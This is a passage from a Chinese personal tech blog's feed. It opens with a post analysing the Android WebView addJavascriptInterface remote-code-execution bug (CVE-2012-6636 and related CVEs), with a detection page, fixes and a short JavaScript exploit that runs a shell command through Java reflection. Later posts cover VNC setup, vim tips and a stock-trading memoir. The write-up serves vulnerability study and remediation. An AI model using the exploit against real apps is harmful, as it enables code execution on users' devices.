class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getDeclaredMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> mObjectClass.newInstance();</span><br><span class="line">        methods[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods[<span class="number">0</span>].invoke(o);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a1</span><br><span class="line">method = a2</span><br><span class="line">I am a1</span><br></pre></td></tr></table></figure><p>已经成功调用了Demo的private a1 方法</p><h2 id="☆-相关漏洞"><a href="#☆-相关漏洞" class="headerlink" title="☆  相关漏洞"></a>☆  相关漏洞</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版<br>本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网<br>页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启）</p><h3 id="CVE-2012-6636-关键的CVE"><a href="#CVE-2012-6636-关键的CVE" class="headerlink" title="CVE-2012-6636  (关键的CVE)"></a>CVE-2012-6636  (关键的CVE)</h3><p>该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可<br>通过使用Java Reflection 利用该漏洞执行任意Java对象的方法。影响使用 API Level 16<br>以及之前的Android 系统。(Android 4.2 为 API Level 17)</p><h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>此漏洞公布了一个可利用的Java Object “searchBoxJavaBridge_”</p><h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>根据 android&#x2F;webkit&#x2F;AccessibilityInjector.java 代码中的介绍，发现当系统辅助<br>功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，<br>分别为是”accessibility”  和 “accessibilityTraversal”。如果APP使用了系统的WebView<br>并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和<br>“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的<br>do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。</p><h2 id="☆-漏洞检测"><a href="#☆-漏洞检测" class="headerlink" title="☆ 漏洞检测"></a>☆ 漏洞检测</h2><p>   使用WebView访问下面页面，输出的接口名称则存在漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0,</span></span></span><br><span class="line"><span class="string"><span class="tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="variable language_">window</span>) </span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>[obj].<span class="title function_">getClass</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">check</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。<br>   是否有getClass的方法，可以作为检测WebView漏洞依据。</p><p>   在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_<br>   可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须<br>   打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口，<br>   因此CVE-2014-7224的影响并不像想象中的那么大。</p><h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">cmd</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">jsinterface</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getMethod</span>(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>,<span class="literal">null</span>).<span class="title function_">exec</span>(cmd);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">execute</span>([<span class="string">&#x27;/system/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。</p><h2 id="☆-修复方法和现状"><a href="#☆-修复方法和现状" class="headerlink" title="☆ 修复方法和现状"></a>☆ 修复方法和现状</h2><p>   Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接：</p><p><a href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p><p>   要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到<br>   API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所<br>   以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。<br>   Android 4.4 以后使用以chrome为基础的WebView。</p><p>   升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript<br>   调用，这样反射就失去作用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆ 参考链接"></a>☆ 参考链接</h2><ul><li><a href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li><li><a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li><li><a href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li><li><a href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li><li><a href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li><li><a href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li><li><a href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li><li><a href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li><li><a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li></ul><h2 id="☆-思考"><a href="#☆-思考" class="headerlink" title="☆ 思考"></a>☆ 思考</h2><p>   WebView 中还提供了一个方法让我们可以获得控制的机会</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.substring(<span class="number">0</span>,<span class="number">6</span>).equalsIgnoreCase(<span class="string">&quot;yourscheme:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// parse the URL object and execute functions</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析<br>   URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="attr">yourscheme</span>:<span class="comment">//method?parameter=value</span></span><br></pre></td></tr></table></figure><p>Google对这个方法的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give the host application a chance to take over the control when a new url </span><br><span class="line">is about to be loaded in the current WebView. If WebViewClient is not </span><br><span class="line">provided, by default WebView will ask Activity Manager to choose the proper </span><br><span class="line">handler for the url. If WebViewClient is provided, return true means the </span><br><span class="line">host application handles the url, while return false means the current </span><br><span class="line">WebView handles the url. This method is not called for requests using </span><br><span class="line">the POST &quot;method&quot;.</span><br></pre></td></tr></table></figure><p>其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;☆-来自-developer-android-com-的信息&quot;&gt;&lt;a href=&quot;#☆-来自-developer-android-com-的信息&quot; class=&quot;headerlink&quot; title=&quot;☆ 来自 developer.android.com 的信息&quot;&gt;</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Fedora 安装 vnc server</title>
    <link href="http://usmacd.com/cn/vnc/"/>
    <id>http://usmacd.com/cn/vnc/</id>
    <published>2023-09-06T03:00:51.882Z</published>
    <updated>2023-09-06T03:00:51.882Z</updated>
    
    <content type="html"><![CDATA[<p>因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。</p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="(1) 安装"></a>(1) 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install tigervnc-server</span><br></pre></td></tr></table></figure><h2 id="2-创建服务"><a href="#2-创建服务" class="headerlink" title="(2) 创建服务"></a>(2) 创建服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@.service</span><br></pre></td></tr></table></figure><p>编辑 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;vncserver@.service 替换下面两行的USER为实际用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=/sbin/runuser -l USER -c &quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;</span><br><span class="line">PIDFile=/home/USER/.vnc/%H%i.pid</span><br></pre></td></tr></table></figure><p>执行命令 <code>systemctl daemon-reload</code></p><p>使用vpnpasswd修改密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~]<span class="comment"># su - USER</span></span><br><span class="line">~]$ vncpasswd</span><br><span class="line">Password:</span><br><span class="line">Verify:</span><br></pre></td></tr></table></figure><p>启动vncserver的命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start vncserver@:1</span><br></pre></td></tr></table></figure><p>参考文档：</p><p><a href="https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html">https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html</a></p><h2 id="3-直接调用命令行"><a href="#3-直接调用命令行" class="headerlink" title="(3)直接调用命令行"></a>(3)直接调用命令行</h2><p>使用上面的方法过于繁琐，可以直接调用 vncserver 的命令行</p><p><code>vncserver :2 -geometry 1920x1080 -depth 24</code></p><h2 id="4-改变vnc的默认桌面"><a href="#4-改变vnc的默认桌面" class="headerlink" title="(4) 改变vnc的默认桌面"></a>(4) 改变vnc的默认桌面</h2><p>vim ~&#x2F;.vnc&#x2F;xstartup</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> SESSION_MANAGER</span><br><span class="line"><span class="built_in">unset</span> DBUS_SESSION_BUS_ADDRESS</span><br><span class="line"><span class="comment">#exec /etc/X11/xinit/xinitrc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /bin/sh /etc/xdg/xfce4/xinitrc</span><br></pre></td></tr></table></figure><p>必须改变默认桌面，要不可能登录不进去。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>个人觉得从安全角度看，使用命令启用 vncserver 是比较合理的，要用了就打开，用完就关。另外vncserver 连接加了一层 tunnel，安全无小事。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。&lt;/p&gt;
&lt;h2 id=&quot;1-安装&quot;&gt;&lt;a href=&quot;#1-安装&quot; class=&quot;headerlink&quot; title=&quot;(1) 安装&quot;&gt;&lt;/a&gt;(1) 安装&lt;/h2&gt;&lt;figure</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>vim 输入特殊字符</title>
    <link href="http://usmacd.com/cn/vim_special_char/"/>
    <id>http://usmacd.com/cn/vim_special_char/</id>
    <published>2023-09-06T03:00:51.880Z</published>
    <updated>2023-09-06T03:00:51.880Z</updated>
    
    <content type="html"><![CDATA[<p>vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。</p><p><a href="http://vimhelp.appspot.com/digraph.txt.html">http://vimhelp.appspot.com/digraph.txt.html</a><br><a href="http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit">http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit</a></p><p>关键就在上面两篇，可能许多人不喜欢看复杂的文章，我这里简单介绍一下用法。</p><p>输入音标 ə</p><p>i 进入编辑模式    CTRL-vu0259<br>那如何知道 ə 的 unicode hex number 是 0259呢，在vim的normal 模式下，将光标移动到ə输入ga</p><p>输入 ⇒</p><p>i 进入编辑模式   CTRL-k&#x3D;&gt;<br>:dig 可以看到支持这种方法输入的unicode 字符</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vimhelp.appspot.com/digraph.txt.html&quot;&gt;http://vimhelp.appspot.com</summary>
      
    
    
    
    
    <category term="vim" scheme="http://usmacd.com/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>VIM + SVN 管理</title>
    <link href="http://usmacd.com/cn/svn_vim/"/>
    <id>http://usmacd.com/cn/svn_vim/</id>
    <published>2023-09-06T03:00:51.812Z</published>
    <updated>2023-09-06T03:00:51.812Z</updated>
    
    <content type="html"><![CDATA[<p>公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。</p><h2 id="1-vcscommand-vim"><a href="#1-vcscommand-vim" class="headerlink" title="1. vcscommand.vim"></a>1. vcscommand.vim</h2><p><a href="http://www.vim.org/scripts/script.php?script_id=90">http://www.vim.org/scripts/script.php?script_id=90</a></p><p>这个插件的特点是支持的版本管理工具多,支持git，svn等常见版本管理工具。<br>vcscommand.vim插件默认绑定了无差别的快捷键，使用起来非常方便。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|&lt;Leader&gt;|ca VCSAdd</span><br><span class="line">|&lt;Leader&gt;|cn VCSAnnotate</span><br><span class="line">|&lt;Leader&gt;|cN VCSAnnotate!</span><br><span class="line">|&lt;Leader&gt;|cc VCSCommit</span><br><span class="line">|&lt;Leader&gt;|cD VCSDelete</span><br><span class="line">|&lt;Leader&gt;|cd VCSDiff</span><br><span class="line">|&lt;Leader&gt;|cg VCSGotoOriginal</span><br><span class="line">|&lt;Leader&gt;|cG VCSGotoOriginal!</span><br><span class="line">|&lt;Leader&gt;|ci VCSInfo</span><br><span class="line">|&lt;Leader&gt;|cl VCSLog</span><br><span class="line">|&lt;Leader&gt;|cL VCSLock</span><br><span class="line">|&lt;Leader&gt;|cr VCSReview</span><br><span class="line">|&lt;Leader&gt;|cs VCSStatus</span><br><span class="line">|&lt;Leader&gt;|cu VCSUpdate</span><br><span class="line">|&lt;Leader&gt;|cU VCSUnlock</span><br><span class="line">|&lt;Leader&gt;|cv VCSVimDiff</span><br></pre></td></tr></table></figure><p>这个 <code>&lt;Leader&gt;</code> 得看你定义了什么快捷键，vim 默认的是 <code>\</code></p><h2 id="2-vim-unite-svn"><a href="#2-vim-unite-svn" class="headerlink" title="2.  vim-unite-svn"></a>2.  vim-unite-svn</h2><p>小日本写的unite.vim的svn插件，unite.vim 是一个非常不错的vim插件，<br>它的作用是 为vim 写简单界面，要使用vim-unite-svn首先需要安装unite.vim 插件，<br>折腾这个插件的原因是vcscommand.vim有些不太好的地方。</p><ul><li>buffer管理的不太好</li><li>status 比较弱</li><li>羡慕emacs的vc mode的体验</li></ul><p><a href="https://github.com/Shougo/unite.vim">https://github.com/Shougo/unite.vim</a></p><p>小日本写的 <code>vim-unite-svn</code> 插件太久没有更新了，有一些bug，我修改了一下，用了<br>一段时间暂时没有发现什么问题。</p><p><a href="https://github.com/henices/vim-unite-svn">https://github.com/henices/vim-unite-svn</a></p><p>支持基本的svn命令， svn status, svn info, svn diff, svn commit, svn up</p><p>使用示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:Unite svn/status</span><br><span class="line">:Unite svn/diff</span><br><span class="line">:Unite svn/blame</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。&lt;/p&gt;
&lt;h2 id=&quot;1-vcscommand-vim&quot;&gt;&lt;a href=&quot;#1-vcscommand-vim&quot; class=&quot;headerlink&quot; title=&quot;1. vcscommand.</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
    <category term="vim" scheme="http://usmacd.com/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>个人炒股经历</title>
    <link href="http://usmacd.com/cn/stock_experience/"/>
    <id>http://usmacd.com/cn/stock_experience/</id>
    <published>2023-09-06T03:00:51.811Z</published>
    <updated>2023-09-06T03:00:51.811Z</updated>
    
    <content type="html"><![CDATA[<p>本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小赚出局了。</p><p>运气好的是，2015年的时候中了一支新股，新股的收益对冲了倒金字塔加仓的回撤，小赚1万元出局清了仓，有时候我也在想如果不是这赚了1万，是不是也就不会继续炒股了。接下来的事情大家都很熟悉了，熔断和股灾3.0，一直在不赚和小亏中挣扎着，居然也坚持了下来。理工男的特质救了我，从2015年开始认真学习股票操作，恶补基础知识，分时，K线，缺口，价量关系，缠论，波浪理论，箱体理论，趋势交易，价值投资，基本各种理论都看了遍，其实到最后发现有用的东西太少了，关于股票的书也基本没啥用，真正有用的书可能就那么几本，可是如果不看几十本的话，你怎么知道哪几本有用呢？所以炒股并不存在什么捷径，一夜暴富基本是神话，为啥呢？盈亏同源，怎么赚钱就可能怎么亏回去，除非你知道你为什么能赚钱。</p><p>下面是这些年的心得，应该可以涨几年功力吧？</p><p>要在市场上生存你必须具备某种优势，没有这种优势就是纯赌博，真正赚钱的是要做大概率的投机。买卖股票实际上是对股票做分类，哪些可以做，哪些不可以做，这就涉及了股票交易系统，有了交易系统，剩下的就是执行问题了，要做到BDWQ，后面就是仓位计算，根据股票的波动和你愿意承担的风险程度计算出来。</p><p>回首看虽然现在稳定盈利了，又回到了灵魂拷问，投入的时间值得吗？对于很多人来说，最重要可能是资金的原始积累，10万块，翻10倍，100万在中国很多城市一套房也买不了，更不用说财富自由了，所以先努力工作吧，边工作边加大投资比例，梦想还是要有的，万一实现了呢？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
</feed>
